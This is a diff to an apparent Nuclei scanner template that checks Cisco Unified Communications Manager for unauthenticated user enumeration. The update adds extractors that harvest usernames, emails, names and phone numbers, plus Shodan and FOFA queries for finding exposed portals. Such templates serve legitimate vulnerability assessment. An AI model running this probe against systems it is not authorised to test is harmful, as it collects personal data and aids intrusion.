@@ -1,21 +1,28 @@
 id: cucm-username-enumeration
 
 info:
-  name: Cisco Unified Call Manager Username Enumeration
-  author: manasmbellani
+  name: Cisco Unified Communications Manager - User Enumeration
+  author: manasmbellani, Morgan Robertson
   severity: medium
-  description: Cisco Unified Call Manager is vulnerable to username enumeration.
+  description: Cisco Unified Call Manager is vulnerable to username enumeration. This template enumerates valid usernames and emails from the Cisco UCM UDS API.
   remediation: To mitigate this, enable Contact Search Authentication.
   reference:
+    - https://developer.cisco.com/site/user-data-services/develop-and-test/api-reference/#users
     - https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/
   metadata:
-    max-request: 1
-  tags: cisco,cucm,unauth,enum,vuln
-
+    product: unified_communications_manager
+    vendor: cisco
+    shodan-query: http.title:"Unified Communications Self Care Portal"
+    fofa-query: title="Unified Communications Self Care Portal"
+  tags: cisco,ucm,enum,users,xml,cucm,unauth,vuln
+  
 http:
   - method: GET
     path:
       - "{{BaseURL}}/cucm-uds/users"
+
+    headers:
+      Accept: application/xml
 
     matchers-condition: and
     matchers:
@@ -24,15 +31,34 @@ http:
           - 200
 
       - type: word
+        part: body
         words:
+          - '<users'
           - '<userName>'
-          - '<lastName>'
-          - '<phoneNumber>'
         condition: and
 
-      - type: dsl
-        dsl:
-          - contains(tolower(content_type), 'application/xml')
-          - contains(tolower(content_type), 'text/xml')
-        condition: or
-# digest: 4a0a0047304502210092e1feee11a035214f821e5197307dcb334fb5ea625e6d2bf199770aba5514d6022062a94b24ac092c9079699928f2c08cde1899b002a2e8810040101a64ae3ea3ee:922c64590222798bb761d5b6d8e72950
+    extractors:
+      - type: xpath
+        name: usernames
+        xpath:
+          - "/users/user/userName"
+
+      - type: xpath
+        name: emails
+        xpath:
+          - "/users/user/email"
+
+      - type: xpath
+        name: full_names
+        xpath:
+          - "concat(/users/user/firstName, ' ', /users/user/lastName)"
+
+      - type: xpath
+        name: phone_numbers
+        xpath:
+          - "/users/user/phoneNumber"
+
+      - type: xpath
+        name: mobile_numbers
+        xpath:
+          - "/users/user/mobileNumber"
